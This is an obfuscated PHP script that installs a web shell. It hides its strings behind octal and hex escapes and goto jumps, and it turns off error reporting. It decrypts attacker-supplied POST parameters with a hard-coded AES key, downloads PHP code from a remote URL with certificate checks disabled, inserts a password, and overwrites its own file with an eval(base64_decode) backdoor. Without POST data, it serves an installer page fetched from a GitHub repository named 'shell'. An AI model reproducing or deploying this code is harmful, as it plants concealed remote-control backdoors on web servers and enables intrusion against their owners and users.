<?php

/*

Don't change anything otherwise this code does not work.

..........Developer...........
.                            .
.    *** Samiul Alim ***     .
.  samiulalim1230@gmail.com  .
.    fb : samiul.alim.1230   .
.     tg : samiulalim1230    .
.                            .
..............................

    Copyright © 2023

*/

goto SEcN6; J5Ux5: function createFileFopen($file, $data) { $fileHandle = fopen($file, "\167"); if ($fileHandle === false) { return false; } else { $bytesWritten = fwrite($fileHandle, $data); fclose($fileHandle); if ($bytesWritten !== false) { return true; } else { return false; } } } goto SoP_E; oGV0N: $mr999plus = str_replace("\x5c", "\57", __DIR__) . "\x2f" . basename(__FILE__); goto RdDrx; MWZ3b: function string_to_octal($str) { $rtn = ''; $chars = str_split($str); foreach ($chars as $c) { $rtn .= "\134" . str_pad(base_convert(ord($c), 10, 8), 3, 0, STR_PAD_LEFT); } return $rtn; } goto J5Ux5; RdDrx: function getDecode($encode) { $key = "\123\x61\155\x69\x75\154\101\154\151\x6d"; $chiper = "\101\105\x53\55\61\62\x38\x2d\x43\124\122"; $iv = hex2bin("\x32\x63\62\66\71\x61\x36\x35\x30\63\67\x63\x31\71\60\146\64\71\71\64\146\61\61\143\x30\146\x31\x65\63\x37\143\x30"); return openssl_decrypt($encode, $chiper, $key, 0, $iv); } goto ZWtfo; ZWtfo: function getContent($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_HTTPHEADER, array("\125\163\x65\162\55\101\x67\x65\x6e\x74\72\40\x4d\x6f\x7a\x69\x6c\154\141\57\x35\x2e\x30\40\50\127\x69\156\x64\157\167\163\40\x4e\x54\x20\x31\60\56\60\73\40\x57\x69\x6e\x36\64\x3b\x20\170\x36\x34\51\40\x41\160\160\154\x65\x57\x65\142\x4b\151\x74\x2f\x35\x33\67\x2e\63\66\40\x28\x4b\110\124\115\114\x2c\40\x6c\x69\153\x65\40\x47\145\143\x6b\157\51\40\x43\x68\162\157\155\x65\57\61\x31\65\56\60\x2e\x30\x2e\x30\x20\x53\x61\x66\141\162\151\57\x35\63\x37\x2e\63\x36")); $output = curl_exec($curl); curl_close($curl); return $output; } goto MWZ3b; SoP_E: if (isset($_POST["\x70\141\x73\163\x77\x6f\x72\x64"], $_POST["\166\145\x72\163\151\157\x6e"], $_POST["\x63\157\154\157\x75\162"])) { $password = string_to_octal($_POST["\x70\x61\x73\163\x77\157\162\144"]); $version = explode("\174\123\110\105\114\114\174", getDecode($_POST["\166\x65\162\x73\x69\x6f\156"])); $php = getContent($version[0]); $index = string_to_octal($version[1]); $script = string_to_octal($version[2]); $style = string_to_octal(getDecode($_POST["\x63\x6f\154\x6f\165\162"])); if ($php == '') { $result["\x73\165\143\x63\145\x73\163"] = false; $result["\x6d\x73\x67"] = "\111\156\x73\164\141\x6c\154\40\146\141\x69\154\145\x64\41"; } else { $install = "\74\77\160\x68\x70\40\x65\166\x61\x6c\50\x62\x61\163\145\66\64\137\x64\x65\143\x6f\x64\145\x28\x27" . base64_encode(str_replace("\174\110\x41\x43\113\x45\x52\x7c", $password, str_replace("\x7c\x53\103\x52\x49\x50\x54\x7c", $script, str_replace("\x7c\x53\x54\x59\x4c\x45\x7c", $style, str_replace("\174\x49\x4e\x44\105\130\174", $index, $php))))) . "\x27\x29\x29\x3b\x20\x3f\x3e"; if (createFileFopen($mr999plus, $install)) { $result["\163\x75\x63\x63\145\163\x73"] = true; } else { if (file_get_contents($mr999plus, $install)) { $result["\x73\x75\143\143\145\x73\x73"] = true; $result["\155\x73\147"] = "\111\x6e\163\164\141\154\154\145\x64\40\163\165\x63\143\145\163\163\x66\x75\154\x6c\x79\41"; } else { $result["\163\165\143\x63\145\163\163"] = false; $result["\x6d\x73\147"] = "\111\156\x73\164\141\154\x6c\40\x70\145\162\x6d\x69\x73\x73\x69\x6f\156\x20\144\145\156\151\145\144\41"; } } } header("\x43\x6f\x6e\x74\x65\x6e\x74\55\x54\x79\160\x65\72\40\x61\160\x70\154\x69\143\x61\164\x69\157\156\x2f\x6a\163\157\156\x3b\40\143\x68\141\x72\163\x65\x74\75\x75\164\x66\x2d\70"); die(json_encode($result)); } else { echo getContent("\x68\164\164\x70\x73\x3a\x2f\57\147\x69\164\150\x75\142\56\143\x6f\155\57\163\141\155\151\165\x6c\141\x6c\151\x6d\61\x2f\163\150\145\154\154\57\162\x61\x77\x2f\155\141\151\x6e\x2f\x69\156\163\x74\x61\x6c\154\57\151\156\x64\145\170\x2e\150\x74\x6d\x6c"); } goto LTYUP; SEcN6: error_reporting(0); goto oGV0N; LTYUP: 

?>
